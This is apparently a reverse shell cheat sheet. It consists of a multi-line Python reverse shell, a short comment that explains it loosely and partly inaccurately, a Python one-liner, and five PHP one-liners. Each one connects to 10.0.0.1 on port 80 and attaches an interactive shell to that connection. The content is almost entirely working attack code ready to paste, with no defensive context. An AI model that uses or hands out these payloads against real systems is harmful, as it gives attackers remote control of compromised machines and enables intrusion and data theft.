`import socket`
`import subprocess`
`import os`
`import pty;`

`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`
`s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0)`

`os.dup2(s.fileno(),1)`
`os.dup2(s.fileno(),2)`

`pty.spawn("/bin/bash")`

# import socket,subprocess,os; instructs Python to immediately import the modules needed to interact with the operating system and establish a valid TCP connection.

# By using s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);, we declare a variable called "s" (short for TCP socket) and set the value as the main function of our imported socket module.

# Separate Python Reverse Shell
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`


# Another Example Of Reverse Shell
`php -r '$sock=fsockopen("10.0.0.1",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
`php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`
`php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'`
`php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'`
`php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`